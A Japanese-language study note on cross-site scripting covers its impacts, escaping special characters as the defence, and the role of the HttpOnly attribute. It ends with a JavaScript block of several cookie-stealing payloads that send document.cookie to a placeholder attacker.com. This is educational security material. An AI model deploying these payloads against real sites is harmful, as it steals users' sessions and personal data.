
動的にWebページを生成するアプリケーションのセキュリティ上の不備を意図的に利用して、悪意のあるスクリプトを混入させることで、攻撃者が仕込んだ操作を実行させたり、別のサイトを横断してユーザのクッキーや個人情報を盗んだりする攻撃手法です。  
XSS脆弱性のあるWebアプリケーションでは、以下の影響を受ける可能性があります。

1. サイト攻撃者のブラウザ上で、攻撃者の用意したスクリプトの実行によりクッキー値を盗まれ、利用者が被害にあう。
2. 同様にブラウザ上でスクリプトを実行され、サイト利用者の権限でWebアプリケーションの機能を利用される。
3. Webサイト上に偽の入力フォームが表示され、フィッシングにより利用者が個人情報を盗まれる。

- 対策：Webページに入力されたデータの出力データが，HTMLタグとして解釈されないように処理する。
  プログラム中のデータをHTMLとして出力する際に、HTMLで特別な意味をもつ文字(<,>,",',&など)を実体参照に置き換えて無害化したり、HTMLタグを削除したりすることによりスクリプトとして解釈されないようにすることが重要です。

![[DOM Based XSS]]

![[Reflected XSS]]

![[Stored XSS]]

![[Content Security Policy#実行できるスクリプトについて]]

## 適切に保護されていないCookieを窃取するXSSサンプル
`Secure`しか設定されていないCookienに対して、以下のようなXSSでログイン中ユーザのCookieを盗み出すことができる。
`HttpOnly`(Javascriptからのアクセスを禁止する属性)が設定されていないCookieでは、`document.cookie`に保存されているので、スクリプトによってアクセスは可能
```javascript
// Common XSS payload formats:

// Basic - Send to attacker's server
new Image().src = "http://attacker.com/collect?cookie=" + document.cookie;

// Using fetch API
fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({
        cookie: document.cookie,
        url: window.location.href
    })
});

// Using XMLHttpRequest
let xhr = new XMLHttpRequest();
xhr.open('POST', 'https://attacker.com/collect', true);
xhr.send(document.cookie);

// Base64 encoding to avoid special characters issues
let encodedData = btoa(document.cookie);
new Image().src = "http://attacker.com/collect?data=" + encodedData;
```